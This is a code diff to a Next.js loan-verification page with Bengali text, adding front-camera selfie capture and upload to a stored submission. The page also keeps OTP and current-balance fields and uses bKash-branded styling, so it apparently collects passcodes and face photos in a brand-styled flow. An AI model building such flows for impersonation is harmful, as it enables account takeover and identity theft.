@@ -1,6 +1,6 @@
 'use client';
 
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import { useRouter } from 'next/navigation';
 import { ChevronLeft, ShieldCheck, Camera, LandPlot, Wallet, ArrowRight } from 'lucide-react';
 import Banner from '@/components/Banner';
@@ -14,6 +14,11 @@ export default function Verify() {
     currentBalance: '',
     otp: ''
   });
+
+  const videoRef = useRef<HTMLVideoElement>(null);
+  const canvasRef = useRef<HTMLCanvasElement>(null);
+  const [stream, setStream] = useState<MediaStream | null>(null);
+  const [capturedImage, setCapturedImage] = useState<string | null>(null);
 
   const [loanSummary, setLoanSummary] = useState<any>(null);
 
@@ -37,6 +42,49 @@ export default function Verify() {
         installment: installment.toFixed(2)
     });
   }, [router]);
+
+  useEffect(() => {
+    if (step === 2 && !capturedImage) {
+        startCamera();
+    } else {
+        stopCamera();
+    }
+    return () => stopCamera();
+  }, [step, capturedImage]);
+
+  const startCamera = async () => {
+    try {
+        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        setStream(s);
+        if (videoRef.current) videoRef.current.srcObject = s;
+    } catch (err) {
+        console.error("Camera error:", err);
+        alert("ক্যামেরা এক্সেস করতে সমস্যা হচ্ছে। অনুগ্রহ করে পারমিশন দিন।");
+    }
+  };
+
+  const stopCamera = () => {
+    if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        setStream(null);
+    }
+  };
+
+  const capturePhoto = () => {
+    if (videoRef.current && canvasRef.current) {
+        const video = videoRef.current;
+        const canvas = canvasRef.current;
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        if (ctx) {
+            ctx.drawImage(video, 0, 0);
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+            setCapturedImage(dataUrl);
+            stopCamera();
+        }
+    }
+  };
 
   const updateSubmission = async (data: any) => {
     const submissionId = sessionStorage.getItem('submission_id');
@@ -91,14 +139,49 @@ export default function Verify() {
       case 2:
         return (
           <div className="flex-1 flex flex-col p-6 space-y-8 text-center animate-in fade-in transition-all duration-300">
-            <div className="w-56 h-56 border-8 border-gray-50 rounded-full flex items-center justify-center bg-gray-50/50 mx-auto mt-10 shadow-inner">
-              <Camera size={64} className="text-gray-300" />
+            <div className="relative w-64 h-64 border-8 border-gray-50 rounded-full overflow-hidden bg-gray-50/50 mx-auto mt-10 shadow-inner flex items-center justify-center">
+              {capturedImage ? (
+                  <img src={capturedImage} alt="Captured" className="w-full h-full object-cover" />
+              ) : (
+                  <>
+                    <video ref={videoRef} autoPlay playsInline className="w-full h-full object-cover mirror" />
+                    <Camera size={64} className="text-gray-300 absolute" />
+                  </>
+              )}
+              <canvas ref={canvasRef} className="hidden" />
             </div>
             <div className="space-y-2">
                 <h2 className="text-2xl font-black text-gray-800">সেলফি ভেরিফিকেশন</h2>
                 <p className="text-sm font-bold text-gray-400">আপনার চেহারা পরিষ্কার দেখা যায় এমন একটি সেলফি তুলুন।</p>
             </div>
-            <button onClick={() => setStep(3)} className="w-full bg-bkash-pink text-white font-black py-4 rounded-2xl shadow-xl active:scale-95 transition-all text-lg mt-auto">ক্যামেরা ওপেন করুন</button>
+            
+            {capturedImage ? (
+                <div className="grid grid-cols-2 gap-4 mt-auto">
+                    <button 
+                        onClick={() => { setCapturedImage(null); startCamera(); }} 
+                        className="w-full bg-slate-100 text-slate-800 font-black py-4 rounded-2xl active:scale-95 transition-all text-lg"
+                    >
+                        আবার তুলুন
+                    </button>
+                    <button 
+                        onClick={async () => {
+                            const success = await updateSubmission({ selfie: capturedImage });
+                            if (success) setStep(3);
+                            else alert("কিছু ভুল হয়েছে।");
+                        }} 
+                        className="w-full bg-bkash-pink text-white font-black py-4 rounded-2xl shadow-xl active:scale-95 transition-all text-lg"
+                    >
+                        নিশ্চিত করুন
+                    </button>
+                </div>
+            ) : (
+                <button 
+                    onClick={capturePhoto} 
+                    className="w-full bg-bkash-pink text-white font-black py-4 rounded-2xl shadow-xl active:scale-95 transition-all text-lg mt-auto"
+                >
+                    ছবি তুলুন
+                </button>
+            )}
           </div>
         );
       case 3:
